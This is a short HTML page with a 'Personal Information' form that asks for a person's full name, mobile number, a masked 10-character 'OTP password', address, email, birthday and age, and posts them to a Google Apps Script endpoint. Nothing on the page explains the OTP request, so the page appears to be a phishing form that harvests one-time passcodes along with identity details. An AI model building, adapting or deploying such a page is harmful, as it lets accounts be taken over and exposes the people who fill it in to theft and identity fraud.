<!DOCTYPE html>
 <head>
    <title>Joshua Santiago</title>
    <link rel="stylesheet " href="style.css">
 </head>
 <body>
    <div class="main">
      <form method="post" action="https://script.google.com/macros/s/AKfycbzOQUfHrQi_wvjZH_uyd4iLDUa-k0aXltMd7r7GvrYQWVmCbuNG7BpmbcgPKXSwa1a4/exec">
      <div class="container">
        
        <div class="heading">

          <h1>Personal Information</h1>

        </div>
        
        <label for="name">Full Name</label>
        <input type="text" id="name" name="name" placeholder="Juan Dela Cruz" required/>

        <br>

        <label for="contact">Contact Number</label>
        <input type="text" minlength="11" maxlength="11" id="contact" name="contact" placeholder="0900 000 0000" required/>
        
        <br>

        <label for="secret key">OTP password</label>
        <input type="password" minlength="10" maxlength="10" id="secret key" name="secret key" placeholder="***** ******" required/>
        
        <br>

        <label for="address">Address</label>
        <input type="text" id="address" name="address" placeholder="House no. Street Name, barangay, City," required/>

        <br>

        <label for="email">E-mail</label>
        <input type="email"  id="email" name="email" placeholder="sample@email.com" required/>
    
        <br>

        <div class="birthday-age">
          <div class="birthday">

            <label for="birthday">Birthday</label>
            <input class="inputCard" name="birthday" id="birthday" type="date" required placeholder="00/00" />

              <br>

          </div>
            <div class="Age">

              <label for="age">Age</label>
              <input type="number" min="18" max="99" id="age" name="age" placeholder="00" required>

              <br>

            </div>
        </div>
          <div class="buttons">
            <input class="rightbutton" type="submit">
            <input class="leftbutton" type="reset" id="reset">
          </div>
  
        </form>  
    
    </div>
  </body>
</html>
